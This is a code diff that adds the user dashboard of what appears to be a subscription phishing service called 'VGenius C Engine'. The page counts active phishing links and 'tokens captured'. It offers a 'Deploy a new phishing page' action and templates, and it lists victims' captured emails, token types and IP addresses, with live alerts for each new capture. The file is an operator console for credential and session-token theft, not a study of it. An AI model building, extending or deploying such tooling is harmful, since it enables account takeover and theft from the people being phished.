@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard – VGenius C Engine</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⚡</text></svg>">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="stylesheet" href="assets/css/user.css">
+    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+</head>
+<body>
+    <!-- Sidebar -->
+    <aside class="main-sidebar" id="mainSidebar"></aside>
+    <div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar()"></div>
+
+    <!-- Navbar -->
+    <nav class="main-header navbar"></nav>
+
+    <!-- Main Content -->
+    <main class="content-wrapper">
+        <!-- Notice Board -->
+        <div class="card" style="display:none;padding:16px 20px;margin-bottom:24px;border-left:3px solid var(--accent);" id="noticeBoard">
+            <div style="font-family:var(--font-heading);font-size:11px;font-weight:600;letter-spacing:0.08em;text-transform:uppercase;color:var(--accent);margin-bottom:6px;">
+                <i class="fas fa-bullhorn"></i> System Notice
+            </div>
+            <div style="font-size:13px;color:var(--text-main);line-height:1.5;" id="noticeContent"></div>
+        </div>
+
+        <!-- Page Header -->
+        <div class="page-header">
+            <h1 class="page-title">Dashboard</h1>
+        </div>
+
+        <!-- Stats -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-icon"><i class="fas fa-link"></i></div>
+                <div class="stat-value" id="activeLinks">0</div>
+                <div class="stat-label">Active Links</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon"><i class="fas fa-key"></i></div>
+                <div class="stat-value" id="tokensCaptured">0</div>
+                <div class="stat-label">Tokens Captured</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon"><i class="fas fa-clock"></i></div>
+                <div class="stat-value" id="daysRemaining">--</div>
+                <div class="stat-label">Days Remaining</div>
+            </div>
+        </div>
+
+        <!-- Subscription Status Card -->
+        <div class="subscription-card">
+            <div class="subscription-title">
+                <i class="fas fa-chart-line"></i> Subscription Status
+            </div>
+            <div class="info-grid">
+                <div class="info-item">
+                    <div class="info-label"><i class="fas fa-circle"></i> Status</div>
+                    <div class="info-value" id="subStatus">
+                        <span class="status-badge-enhanced active" id="statusBadge">
+                            <i class="fas fa-check-circle"></i> ACTIVE
+                        </span>
+                    </div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label"><i class="fas fa-calendar"></i> Plan</div>
+                    <div class="info-value" id="subPlan"><i class="fas fa-crown"></i> --</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label"><i class="fas fa-hourglass-half"></i> Remaining</div>
+                    <div class="info-value" id="subRemaining"><i class="fas fa-hourglass-half"></i> --</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label"><i class="fas fa-calendar-check"></i> Valid Until</div>
+                    <div class="info-value" id="subExpiry"><i class="fas fa-calendar-day"></i> --</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Quick Actions -->
+        <div class="section-header" style="margin-top:28px;">
+            <span class="section-title">Quick Actions</span>
+        </div>
+        <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:28px;">
+            <a href="links.html" class="quick-action-card">
+                <div class="quick-action-icon"><i class="fas fa-plus"></i></div>
+                <div><div class="quick-action-label">Create Link</div><div class="quick-action-desc">Deploy a new phishing page</div></div>
+            </a>
+            <a href="tokens.html" class="quick-action-card">
+                <div class="quick-action-icon"><i class="fas fa-key"></i></div>
+                <div><div class="quick-action-label">View Tokens</div><div class="quick-action-desc">Browse captured data</div></div>
+            </a>
+            <a href="templates.html" class="quick-action-card">
+                <div class="quick-action-icon"><i class="fas fa-file-code"></i></div>
+                <div><div class="quick-action-label">Templates</div><div class="quick-action-desc">12 templates available</div></div>
+            </a>
+        </div>
+
+        <!-- Recent Tokens -->
+        <div class="section-header">
+            <span class="section-title">Recent Tokens</span>
+            <a href="tokens.html" style="font-size:12px;color:var(--accent);font-weight:500;">View all <i class="fas fa-arrow-right" style="font-size:10px;"></i></a>
+        </div>
+        <div class="card" style="overflow:hidden;">
+            <table class="tokens-table">
+                <thead><tr><th>Email</th><th>Type</th><th>IP</th><th>Time</th></tr></thead>
+                <tbody id="tokensBody">
+                    <tr><td colspan="4" class="empty-state" style="padding:40px;"><i class="fas fa-inbox"></i>No tokens captured yet</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </main>
+
+    <script src="assets/js/user.js"></script>
+    <script>
+        const token = getToken();
+        if (!token) window.location.href = '/user-panel/index.html';
+
+        // Init shared components
+        initShared('dashboard');
+
+        // Load dashboard data
+        async function loadDashboard() {
+            try {
+                const [profileRes, dashRes, tokensRes] = await Promise.all([
+                    fetch(`${API}/user/profile`, { headers: authHeaders() }),
+                    fetch(`${API}/user/dashboard`, { headers: authHeaders() }),
+                    fetch(`${API}/tokens?limit=5`, { headers: authHeaders() }),
+                ]);
+                
+                const profile = await profileRes.json();
+                const dash = await dashRes.json();
+                const tokensData = await tokensRes.json();
+
+                // Stats
+                document.getElementById('activeLinks').textContent = dash.active_links || 0;
+                document.getElementById('tokensCaptured').textContent = dash.tokens_captured || 0;
+                document.getElementById('daysRemaining').textContent = dash.days_remaining !== null ? dash.days_remaining : '∞';
+
+                // Subscription Info Grid
+                const isActive = profile.subscription_status === 'active';
+                const statusBadge = document.getElementById('statusBadge');
+                if (isActive) {
+                    statusBadge.className = 'status-badge-enhanced active';
+                    statusBadge.innerHTML = '<i class="fas fa-check-circle"></i> ACTIVE';
+                } else if (profile.subscription_status === 'expired') {
+                    statusBadge.className = 'status-badge-enhanced expired';
+                    statusBadge.innerHTML = '<i class="fas fa-times-circle"></i> EXPIRED';
+                } else {
+                    statusBadge.className = 'status-badge-enhanced suspended';
+                    statusBadge.innerHTML = '<i class="fas fa-pause-circle"></i> ' + (profile.subscription_status || 'UNKNOWN').toUpperCase();
+                }
+                
+                const planEl = document.getElementById('subPlan');
+                planEl.innerHTML = '<i class="fas fa-crown"></i> ' + (profile.subscription_plan || 'N/A').toUpperCase();
+                
+                const remainingEl = document.getElementById('subRemaining');
+                if (dash.days_remaining !== null) {
+                    remainingEl.innerHTML = '<i class="fas fa-hourglass-half"></i> ' + dash.days_remaining + ' days';
+                } else {
+                    remainingEl.innerHTML = '<i class="fas fa-infinity"></i> Unlimited';
+                }
+                
+                const expiryEl = document.getElementById('subExpiry');
+                if (profile.subscription_expiry) {
+                    expiryEl.innerHTML = '<i class="fas fa-calendar-day"></i> ' + new Date(profile.subscription_expiry).toLocaleDateString();
+                } else {
+                    expiryEl.innerHTML = '<i class="fas fa-infinity"></i> Lifetime';
+                }
+
+                // Recent tokens
+                const tokens = tokensData.tokens || [];
+                const tbody = document.getElementById('tokensBody');
+                if (tokens.length === 0) {
+                    tbody.innerHTML = '<tr><td colspan="4" class="empty-state" style="padding:40px;"><i class="fas fa-inbox"></i>No tokens captured yet</td></tr>';
+                } else {
+                    tbody.innerHTML = tokens.map(t => `
+                        <tr>
+                            <td>${t.email || 'Unknown'}</td>
+                            <td><span class="badge">${(t.token_type || 'token').toUpperCase()}</span></td>
+                            <td style="font-family:var(--font-heading);font-size:11px;color:var(--muted)">${t.ip_address || '--'}</td>
+                            <td style="font-size:12px;color:var(--muted)">${timeAgo(t.created_at)}</td>
+                        </tr>
+                    `).join('');
+                }
+
+                localStorage.setItem('vg-user', JSON.stringify(profile));
+            } catch (e) {
+                console.error('Dashboard load error:', e);
+            }
+        }
+
+        // Load notices
+        async function loadNotices() {
+            try {
+                const res = await fetch(`${API}/notices/latest`);
+                const notice = await res.json();
+                if (notice && notice.active) {
+                    document.getElementById('noticeContent').textContent = notice.content || notice.title;
+                    document.getElementById('noticeBoard').style.display = 'block';
+                }
+            } catch (e) {}
+        }
+
+        // WebSocket for real-time updates
+        function initWebSocket() {
+            try {
+                const socket = io(window.location.origin, { transports: ['websocket', 'polling'] });
+                socket.on('connect', () => {
+                    try {
+                        const payload = JSON.parse(atob(token.split('.')[1]));
+                        socket.emit('subscribe', { room: `user_${payload.user_id}` });
+                    } catch (e) {}
+                });
+                socket.on('new_token', (data) => {
+                    showToast(`New token captured: ${data.email || 'Unknown'}`);
+                    loadDashboard();
+                });
+            } catch (e) {}
+        }
+
+        // Handle token expiry
+        if (token) {
+            try {
+                const payload = JSON.parse(atob(token.split('.')[1]));
+                if (payload.exp * 1000 < Date.now()) {
+                    localStorage.removeItem('vg-token');
+                    window.location.href = '/user-panel/index.html';
+                }
+            } catch (e) {}
+        }
+
+        loadDashboard();
+        loadNotices();
+        initWebSocket();
+    </script>
+</body>
+</html>
